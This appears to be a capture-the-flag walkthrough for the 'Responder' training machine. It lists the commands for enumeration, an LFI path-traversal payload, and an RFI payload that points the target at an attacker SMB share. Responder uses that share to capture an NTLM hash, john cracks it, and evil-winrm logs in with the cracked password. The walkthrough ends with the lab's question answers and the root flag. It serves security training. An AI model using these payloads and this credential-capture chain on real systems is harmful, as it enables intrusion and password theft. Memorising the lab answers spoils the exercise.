# Responder - Very Easy

```shell
nmap -Pn -T5 -p- -A 10.129.77.45

sudo vim /etc/hosts
#add 10.129.77.45 unika.htb

gobuster dir -u http://10.129.77.45:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .php
#attempt LFI

sudo responder -I tun0
#now attempt RFI
#this gives us the hash value to be cracked

echo "Administrator::RESPONDER:9f2ff3d8137f3b0b:C046BBAA054F751584A147E7A676474D:010100000000000080E655B53B73D8018265A9261CA374FA000000000200080036004F004D00530001001E00570049004E002D00330033004D0038004A0049004500540045005600530004003400570049004E002D00330033004D0038004A004900450054004500560053002E0036004F004D0053002E004C004F00430041004C000300140036004F004D0053002E004C004F00430041004C000500140036004F004D0053002E004C004F00430041004C000700080080E655B53B73D80106000400020000000800300030000000000000000100000000200000EC646518BDA53D2FF0DC9F772FF14162C86FD28635E668C97F1C7DFF609100680A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100310030000000000000000000" > responderhash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt responderhash.txt 
#this gives us the password

evil-winrm -i 10.129.201.232 -u Administrator -p badminton
#gives access

dir

cd ..

cd ..

tree /F
#shows file layout

cd Mike\Desktop

type flag.txt
```

```markdown
On visiting http://10.129.77.45, we are redirected to unika.htb, which is a non-responsive domain.

We can add this to our /etc/hosts file.

On visiting http://10.129.77.45:5985, we get a 404 error.

We can use gobuster or ffuf to check any hidden directories.

We can check other directories such as /css, /img, /examples, /js, /inc, /*checkout*, /phpmyadmin, based on the results.

From our initial enumeration, we now know that Apache 2.4.52 (Win64), OpenSSL 1.1.1m, PHP 8.1.1 is used.

On changing the option for languages, we get the 'page' parameter; it is used such that we can attempt for LFI or RFI.

LFI - http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

Similarly, the webpage is vulnerable to RFI as well.

We can take advantage of RFI using Responder tool, and using that we can try to get the NTLM hashes.

RFI - http://unika.htb/index.php?page=//10.10.15.110/somefile

On using the Responder tool, we do get the hash, which can be cracked using john.

We can now use evil-winrm to get session, as we have username and password and IP address.

Once we get access, we can get the root flag.
```

1. How many TCP ports are open on the machine? - 3

2. When visiting the web service using the IP address, what is the domain that we are being redirected to? - unika.htb

3. Which scripting language is being used on the server to generate webpages? - PHP

4. What is the name of the URL parameter which is used to load different language versions of the webpage? - page

5. Which of the following values for the 'page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability? - ../../../../../../../../windows/system32/drivers/etc/hosts

6. Which of the following values for the 'page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability? - //10.10.14.6/somefile

7. What does NTLM stand for? - New Technology LAN Manager

8. Which flag do we use in the Responder utility to specify the network interface? - -I

9. What is the full name for the 'john' tool? - john the ripper

10. What is the password for the administrator user? - badminton

11. What port TCP does the Windows service listen on? - 5985

12. Submit root flag? - ea81b7afddd03efaa0945333ed147fac
